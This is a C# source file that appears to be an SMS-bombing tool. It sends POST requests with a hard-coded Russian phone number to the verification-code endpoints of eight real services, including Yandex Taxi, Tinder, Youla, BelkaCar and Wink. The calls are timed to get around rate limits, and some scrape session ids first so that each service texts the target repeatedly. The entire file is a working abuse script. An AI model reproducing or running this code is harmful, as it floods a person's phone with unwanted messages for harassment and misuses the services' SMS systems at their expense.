using System;
using System.Net;
using System.IO;
using System.Text;
using System.Threading;

namespace test
{
    class MainClass
    {
        static string basePhone = "9029885784"; //without country code

        static YandexTaxi yandexTaxi = new YandexTaxi(basePhone);
        static Tinder tinder = new Tinder(basePhone);
        static Youla youla = new Youla(basePhone);
        static Karusel karusel = new Karusel(basePhone);
        static BelkaCar belkaCar = new BelkaCar(basePhone);
        static YandexEda yandexEda = new YandexEda(basePhone);
        static SalamPay salamPay = new SalamPay(basePhone);
        static Wink wink = new Wink(basePhone);

        public static void Main(string[] args)
        {
            Thread delay60 = new Thread(() => Delay60s());
            Thread delay30 = new Thread(() => Delay30s());
            Thread delay20 = new Thread(() => Delay20s());

            delay60.Start();
            //delay30.Start();
            //delay20.Start();
        }

        public static void ShowAnswer(WebRequest request)
        {
            var response = (HttpWebResponse)request.GetResponse();
            using (var streamReader = new StreamReader(response.GetResponseStream()))
            {
                var result = streamReader.ReadToEnd(); Console.WriteLine(result);
            }
        }

        public static void Delay60s()
        {
            for (int i = 0; i < 1; ++i)
            {
                Console.WriteLine("===== 60s delay =====");
                yandexTaxi.SendYaTaxiPOST();
                karusel.SendKaruselPOST();
                belkaCar.SendBelkaCarPOST();
                yandexEda.SenYaEdaPOST();
                Thread.Sleep(61000);
            }

        }

        public static void Delay30s()
        {
            for (int i = 0; i < 1; ++i)
            {
                Console.WriteLine("===== 30s delay =====");
                wink.SendWinkPOST();
                Thread.Sleep(35000);
            }
        }

        public static void Delay20s()
        {
            for (int i = 0; i < 1; ++i)
            {
                Console.WriteLine("===== 20s delay =====");
                tinder.SendTinderPOST();
                youla.SendYoulaPOST();
                salamPay.SendSalamPayPOST();
                Thread.Sleep(20000);
            }
        }

        class YandexTaxi
        {
            public YandexTaxi(string temp)
            {
                phone = "+7" + temp;
            }

            public void GetYaTaxiCode()
            {

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://taxi.yandex.ru/#auth");
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                if (response.StatusCode == HttpStatusCode.OK)
                {
                    Stream receiveStream = response.GetResponseStream();
                    StreamReader readStream = null;
                    if (response.CharacterSet == null)
                    {
                        readStream = new StreamReader(receiveStream);
                    }
                    else
                    {
                        readStream = new StreamReader(receiveStream, Encoding.GetEncoding(response.CharacterSet));
                    }
                    id = readStream.ReadToEnd();
                    string searchID = "false,\"id\":\"";
                    int searchResult = id.IndexOf(searchID);
                    id = id.Substring(searchResult + searchID.Length, 32);
                    response.Close();
                    readStream.Close();
                }
            }

            public void SendYaTaxiPOST()
            {
                GetYaTaxiCode();

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://taxi.yandex.ru/3.0/auth");
                request.ContentType = "application/json";
                request.Method = "POST";

                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
                {
                    string json = "{\"id\":\"" + id + "\"," +
                                  "\"phone\":\"" + phone + "\"}";

                    streamWriter.Write(json);
                }

                ShowAnswer(request);
            }

            private static string phone, id;
        }

        class Tinder
        {
            public Tinder(string temp)
            {
                phone = "7" + temp;
            }

            public void SendTinderPOST()
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en");
                request.ContentType = "application/json";
                request.Method = "POST";

                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
                {
                    string json = "{\"phone_number\":\"" + phone + "\"}";

                    streamWriter.Write(json);
                }

                ShowAnswer(request);
            }

            private static string phone;
        }

        class Youla
        {
            public Youla(string temp)
            {
                phone = "+7" + temp;
            }

            public void SendYoulaPOST()
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://youla.ru/web-api/auth/request_code");
                request.ContentType = "application/json";
                request.Method = "POST";

                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
                {
                    string json = "{\"phone\":\"" + phone + "\"}";

                    streamWriter.Write(json);
                }

                ShowAnswer(request);
            }

            private static string phone;
        }

        class Karusel //interval 60 sec
        {
            public Karusel(string temp)
            {
                phone = "7" + temp;
            }

            public void SendKaruselPOST()
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://app.karusel.ru/api/v1/phone/");
                request.ContentType = "application/json";
                request.Method = "POST";

                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
                {
                    string json = "{\"phone\":\"" + phone + "\"}";

                    streamWriter.Write(json);
                }

                ShowAnswer(request);
            }

            private static string phone;
        }

        class BelkaCar //interval 60 sec
        {
            public BelkaCar(string temp)
            {
                phone = "7" + temp;
            }

            public void SendBelkaCarPOST()
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lk.belkacar.ru/get-confirmation-code");
                request.ContentType = "application/x-www-form-urlencoded";
                request.Method = "POST";
                request.UserAgent = "Mozilla/5.0";

                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
                {
                    string json = "phone=" + phone;

                    streamWriter.Write(json);
                }

                ShowAnswer(request);
            }

            private static string phone;
        }

        class YandexEda //interval 60 sec
        {
            public YandexEda(string temp)
            {
                phone = "+7" + temp;
            }

            public void SenYaEdaPOST()
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://eda.yandex/api/v1/user/request_authentication_code");
                request.ContentType = "application/json";
                request.Method = "POST";

                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
                {
                    string json = "{\"phone_number\":\"" + phone + "\"}";

                    streamWriter.Write(json);
                }

                ShowAnswer(request);
            }

            private static string phone;
        }

        class SalamPay //interval 15s
        {
            public SalamPay(string temp)
            {
                phone = "7" + temp;
            }

            public void SendSalamPayPOST()
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29");
                request.ContentType = "application/x-www-form-urlencoded";
                request.Method = "POST";

                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
                {
                    string json = "caller_number=" + phone;

                    streamWriter.Write(json);
                }

                ShowAnswer(request);
            }

            private static string phone;
        }

        class Wink //interval 30 sec
        {
            public Wink(string temp)
            {
                phone = "+7" + temp;
            }

            public void GetWinkSessionID()
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/portal/session_tokens");
                request.ContentType = "application/json";
                request.Method = "POST";

                var response = (HttpWebResponse)request.GetResponse();
                using (var streamReader = new StreamReader(response.GetResponseStream()))
                {
                    Stream receiveStream = response.GetResponseStream();
                    StreamReader readStream = null;
                    if (response.CharacterSet == null)
                    {
                        readStream = new StreamReader(receiveStream);
                    }
                    else
                    {
                        readStream = new StreamReader(receiveStream, Encoding.GetEncoding(response.CharacterSet));
                    }
                    id = readStream.ReadToEnd();
                    string searchID = "session_id\":\"";
                    int searchResult = id.IndexOf(searchID);
                    id = id.Substring(searchResult + 13, 54);
                }
            }

            public void SendWinkPOST()
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://cnt-odcv-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code");
                request.ContentType = "application/json";
                request.Method = "POST";

                GetWinkSessionID();

                request.Headers.Add("session_id:" + id);

                using (var streamWriter = new StreamWriter(request.GetRequestStream()))
                {
                    string json = "{\"phone\":\"" + phone + "\", \"action\":\"register\"}";

                    streamWriter.Write(json);
                }

                ShowAnswer(request);
            }

            private static string phone, id;
        }
    }
}